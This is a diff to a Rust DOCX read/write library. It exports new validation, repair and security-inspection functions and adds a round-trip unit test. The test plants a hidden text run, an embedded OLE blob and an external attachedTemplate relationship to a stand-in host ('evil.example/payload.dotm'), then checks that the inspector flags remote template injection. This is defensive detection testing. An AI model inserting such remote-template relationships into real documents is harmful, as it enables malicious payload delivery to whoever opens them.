@@ -2,10 +2,17 @@
 //! supporting Track Changes (`<w:ins>`/`<w:del>`), Threaded Comments (`word/comments.xml`),
 //! Security Classifications, and Lossless Enterprise ZIP Passthrough.
 
+pub mod intelligence;
 pub mod reader;
 pub mod writer;
 pub mod xml_lite;
 
+pub use intelligence::{
+    inspect_formatting_consistency, inspect_security_and_hidden, repair_docx_bytes,
+    repair_docx_file, validate_docx_bytes, validate_docx_file, ConsistencyFinding,
+    DocxRepairReport, DocxValidationReport, IssueSeverity, SecurityFinding,
+    SecurityInspectionReport, ValidationFinding,
+};
 pub use reader::{load_docx_bytes, load_docx_file, load_docx_shared_with_progress};
 pub use writer::{save_docx_bytes, save_docx_file};
 
@@ -270,5 +277,69 @@ mod tests {
         assert_eq!(imgs[0].intrinsic_px, Some((2560, 1440)));
         // Both ImageBlocks share the exact same underlying `Arc<[u8]>` slice (zero RAM duplication!)
         assert_eq!(imgs[0].png_bytes.as_ptr(), imgs[1].png_bytes.as_ptr());
+    }
+
+    #[test]
+    fn test_v30_footnotes_endnotes_hyperlinks_hidden_sections_validate_and_repair() {
+        let mut doc = TemplateKind::WelcomeGuide.build();
+        doc.metadata.subject = "Enterprise v3.0 Audit".into();
+        doc.metadata.company = "RustPad Sovereign Lab".into();
+        let fn_id = doc.add_footnote(0, "Primary archival citation footnote.", "Nour Yahyaoui");
+        let en_id = doc.add_endnote(0, "Regulatory compliance endnote.", "Nour Yahyaoui");
+        assert_eq!(fn_id, 1);
+        assert_eq!(en_id, 1);
+
+        // Add hyperlinked + hidden span + section break + embedded OLE passthrough
+        let mut link_para = doc_model::Paragraph::new(doc_model::ParagraphStyle::Normal, "");
+        let mut link_style = doc_model::SpanStyle::default();
+        link_style.hyperlink = Some("https://rustpad-studio.vercel.app/".into());
+        link_style.underline = true;
+        let mut hidden_style = doc_model::SpanStyle::default();
+        hidden_style.hidden = true;
+        link_para.spans = vec![
+            doc_model::TextSpan::styled("Official Studio", link_style),
+            doc_model::TextSpan::styled("SECRET_INTERNAL_TOKEN", hidden_style),
+        ];
+        doc.blocks.push(Block::Paragraph(link_para));
+        doc.blocks
+            .push(Block::SectionBreak(doc_model::SectionBreakKind::NextPage));
+        doc.extra_relationships.push(doc_model::RawRelationship {
+            id: "rIdEvilTemplate".into(),
+            rel_type: "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate".into(),
+            target: "https://evil.example/payload.dotm".into(),
+            target_mode: Some("External".into()),
+        });
+        doc.passthrough_shared.insert(
+            "word/embeddings/oleObject1.bin".into(),
+            doc_model::SharedBytes::from_slice(&[0xD0, 0xCF, 0x11, 0xE0, 1, 2, 3, 4]),
+        );
+
+        let bytes = save_docx_bytes(&doc);
+        let v_rep = validate_docx_bytes(&bytes);
+        assert!(v_rep.is_valid, "expected valid v3.0 package: {:?}", v_rep.findings);
+
+        let round = load_docx_bytes(&bytes).expect("roundtrip v3.0 docx");
+        assert_eq!(round.footnotes.len(), 1);
+        assert_eq!(round.endnotes.len(), 1);
+        assert_eq!(round.metadata.company, "RustPad Sovereign Lab");
+        assert!(round
+            .passthrough_shared
+            .contains_key("word/embeddings/oleObject1.bin")
+            || round
+                .passthrough_parts
+                .contains_key("word/embeddings/oleObject1.bin"));
+
+        let sec = inspect_security_and_hidden(&round, Some(&bytes));
+        assert!(sec.hidden_runs_count >= 1);
+        assert!(sec.has_embedded_ole);
+        assert!(sec.has_external_template_injection);
+
+        // Corrupt the EOCD & Central Directory tail and verify `repair_docx_bytes` salvages it!
+        let truncated = &bytes[..bytes.len() - 48];
+        assert!(!validate_docx_bytes(truncated).is_valid);
+        let (repaired_bytes, repair_rep) =
+            repair_docx_bytes(truncated).expect("salvage & repair truncated docx");
+        assert!(repair_rep.recovered_paragraphs >= 3);
+        assert!(validate_docx_bytes(&repaired_bytes).is_valid);
     }
 }
